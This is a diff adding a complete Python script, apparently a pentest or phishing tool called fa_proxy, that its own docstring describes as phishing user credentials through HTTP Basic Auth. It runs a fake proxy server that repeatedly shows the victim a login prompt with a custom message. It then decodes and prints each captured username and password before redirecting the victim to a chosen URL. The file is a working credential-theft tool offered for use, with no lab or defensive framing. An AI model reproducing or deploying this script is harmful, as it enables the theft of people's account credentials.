@@ -1,0 +1,78 @@
+#!/usr/bin/env python3
+"""
+Uses HTTP Basic Auth to phish user credentials.
+"""
+
+import sys
+import base64
+import argparse
+from collections import namedtuple
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+def dict_from_args():
+    parser = argparse.ArgumentParser(description=__doc__)
+    parser.add_argument('url', help='the url the user will be redirected to')
+    parser.add_argument('msg', help='message to be displayed to the user')
+    parser.add_argument('-l', '--listen', metavar='HOST', default='0.0.0.0', 
+                        help='host the server should listen on')
+
+    parser.add_argument('-p', '--port', metavar='PORT', type=int, default=8080,
+                        help='port the server should listen on')
+
+    parser.add_argument('-t', '--times', metavar='TIMES', type=int, default=2,
+                        help='number of times the credential will be asked')
+
+    args = parser.parse_args()
+
+    return vars(args)
+
+def custom_handler(url, msg, times):
+    count = 0
+
+    class FakeProxyHandler(BaseHTTPRequestHandler):
+
+        def do_AUTHHEAD(self):
+            self.send_response(401)
+            self.send_header('WWW-Authenticate', 'Basic realm="%s"' % msg)
+            self.end_headers()
+
+        def do_GET(self):
+            nonlocal count
+
+            if self.headers['Authorization'] == None or count < times:
+                self.do_AUTHHEAD()
+                count += 1
+            else:
+                self.send_response(302)
+                self.send_header('Location', url)
+                self.end_headers()
+
+            if self.headers['Authorization'] != None and 'Basic' in self.headers['Authorization']: 
+                res = self.headers['Authorization'].replace('Basic ', '')
+                print('*** CREDENTIALS GATHERED -> %s ***' % base64.standard_b64decode(res).decode('utf8'))
+
+    return FakeProxyHandler
+
+
+def main():
+    arg_dict = dict_from_args()
+
+    socket = (arg_dict['listen'], arg_dict['port'])
+    handler = custom_handler(arg_dict['url'], arg_dict['msg'], arg_dict['times'])
+    
+    print('Starting fa_proxy on %s port %d' % (arg_dict['listen'],
+                                               arg_dict['port']))
+    
+    try:
+        httpd = HTTPServer(socket, handler)
+        httpd.serve_forever()
+
+    except KeyboardInterrupt:
+        print('\nStopping fa_proxy...')
+
+    except PermissionError:
+        print('Couldn\'t listen on the specified port. Are you root?',
+              file=sys.stderr)
+
+if __name__ == '__main__':
+    main()
